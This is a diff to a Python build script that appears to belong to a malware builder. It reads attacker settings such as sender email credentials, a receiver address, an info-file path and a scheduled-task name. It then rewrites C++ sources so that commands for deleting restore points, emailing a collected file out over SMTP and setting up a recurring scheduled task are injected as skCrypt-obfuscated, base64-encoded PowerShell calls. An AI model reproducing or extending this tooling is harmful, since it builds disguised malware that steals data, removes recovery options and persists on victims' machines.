@@ -24,7 +24,30 @@ CHANGE_WALLPAPER = False
 DEBUG_SEND_EMAIL = False
 SEND_EMAIL = False
 CHANGE_FILE_ICON = False
+SENDERMAIL = "defaultSenderEmail@email.com"
+SENDERPSW = "password1234!"
+RECEIVERMAIL = "defaultReceiverEmail@email.com"
+EMAILSUBJECT = "Default Subject"
+EMAILBODY = "Default body"
+INFOFILE = "default/path/to/info.txt"
+
 for line in open('../commons/common.h', 'r').readlines():
+    if '#define SENDERMAIL' in line:
+        SENDERMAIL = line.split('"')[1]
+    if '#define SENDERPSW' in line:
+        SENDERPSW = line.split('"')[1]
+    if '#define RECEIVERMAIL' in line:
+        RECEIVERMAIL = line.split('"')[1]
+    if '#define EMAILSUBJECT' in line:
+        EMAILSUBJECT = line.split('"')[1]
+    if '#define EMAILBODY' in line:
+        EMAILBODY = line.split('"')[1]
+    if '#define INFOFILE' in line:
+        INFOFILE = line.split('"')[1]
+    if '#define TASKNAME' in line:
+        TASKNAME = line.split('"')[1]
+    if '#define MINUTES' in line:
+        MINUTES = line.split('"')[1]
     if '#define DEBUG' in line and 'true' in line:
         DEBUG = True
     if '#define EMAILSENDER' in line:
@@ -61,35 +84,12 @@ def split_str(seq, chunk, skip_tail=False):
 
 
 def encryptString(string):
-    return os.popen('powershell [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(\\"' + str(string) + '\\"))').read()[:-1]
+    return os.popen('powershell [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(\\"' + str(string.replace('"', '\\"')) + '\\"))').read()[:-1]
 
 def getEmailSenderCryptedAndEncoded(filePath):
-    SENDERMAIL = "defaultSenderEmail@email.com"
-    SENDERPSW = "password1234!"
-    RECEIVERMAIL = "defaultReceiverEmail@email.com"
-    EMAILSUBJECT = "Default Subject"
-    EMAILBODY = "Default body"
-    INFOFILE = "default/path/to/info.txt"
     server = 'smtp.gmail.com'
     port = 587
     host = 'www.google.com'
-
-
-    for line in open('../commons/common.h', 'r').readlines():
-        if ' ' in line:
-            if line.split(' ')[1].split('\t')[0] == 'SENDERMAIL':
-                SENDERMAIL = line.split('"')[1]
-            elif line.split(' ')[1].split('\t')[0] == 'SENDERPSW':
-                SENDERPSW = line.split('"')[1]
-            elif line.split(' ')[1].split('\t')[0] == 'RECEIVERMAIL':
-                RECEIVERMAIL = line.split('"')[1]
-            elif line.split(' ')[1].split('\t')[0] == 'EMAILSUBJECT':
-                EMAILSUBJECT = line.split('"')[1]
-            elif line.split(' ')[1].split('\t')[0] == 'EMAILBODY':
-                EMAILBODY = line.split('"')[1]
-            elif line.split(' ')[1].split('\t')[0] == 'INFOFILE':
-                INFOFILE = line.split('"')[1]
-
 
     shellText = open(filePath, 'r').read()
     shellText = shellText.replace("SENDERMAIL", encryptString(SENDERMAIL))
@@ -223,3 +223,75 @@ main_cppRead.close()
 main_cppWrite = open('main.cpp', 'w')
 main_cppWrite.write(content)
 main_cppWrite.close()
+
+
+
+security_cppRead = open('security.cpp', 'r')
+content = ""
+next = False
+
+for line in security_cppRead.readlines():
+    if next:
+        command = line.split('"')[1]
+        content += f'\tsystem(skCrypt("powershell -eNcODeDcOmMAnd {encryptString(command)}"));\n'
+        open('preCompilation.tmp', 'a').write("deleteRestPo=" + command + "\n")
+        next = False
+        continue
+
+    if line == 'void DeleteRestorePoints() {\n':
+        next = True
+
+    content += line
+
+security_cppRead.close()
+
+security_cppWrite = open('security.cpp', 'w')
+security_cppWrite.write(content)
+security_cppWrite.close()
+
+
+
+sender_cppRead = open('sender.cpp', 'r')
+content = ""
+nextEmail = False
+nextSchedule1 = False
+nextSchedule2 = False
+
+for line in sender_cppRead.readlines():
+    if nextEmail:
+        command = line.split('"')[1]
+        open('preCompilation.tmp', 'a').write("sendEmail=" + command + "\n")
+        command = command.replace('$SENDERMAIL', SENDERMAIL).replace('$SENDERPSW', SENDERPSW).replace('$RECEIVERMAIL', RECEIVERMAIL).replace('$EMAILSUBJECT', EMAILSUBJECT).replace('$EMAILBODY', EMAILBODY).replace('$INFOFILE', INFOFILE)
+        content += f'\tsystem(skCrypt("powershell -eNcODeDcOmMAnd {encryptString(command)}"));\n'
+        nextEmail = False
+        continue
+
+    if nextSchedule1:
+        command = '"'.join(line.split('"')[1:-1])
+        open('preCompilation.tmp', 'a').write("task1=" + command + "\n")
+        command = command.replace('$TASKNAME', TASKNAME)
+        content += f'\tsystem(skCrypt("powershell -eNcODeDcOmMAnd {encryptString(command)}"));\n'
+        nextSchedule1 = False
+        nextSchedule2 = True
+        continue
+
+    if nextSchedule2:
+        command = '"'.join(line.split('"')[1:-1])
+        open('preCompilation.tmp', 'a').write("task2=" + command + "\n")
+        command = command.replace('$TASKNAME', TASKNAME).replace('$MINUTES', str(MINUTES)).replace('$EMAILSENDER', emailSenderLastPath)
+        content += f'\tsystem(skCrypt("powershell -eNcODeDcOmMAnd {encryptString(command)}"));\n'
+        nextSchedule2 = False
+        continue
+
+    if line == 'void SendEmail() {\n':
+        nextEmail = True
+    if line == 'void ScheduleTask() {\n':
+        nextSchedule1 = True
+
+    content += line
+
+sender_cppRead.close()
+
+sender_cppWrite = open('sender.cpp', 'w')
+sender_cppWrite.write(content)
+sender_cppWrite.close()
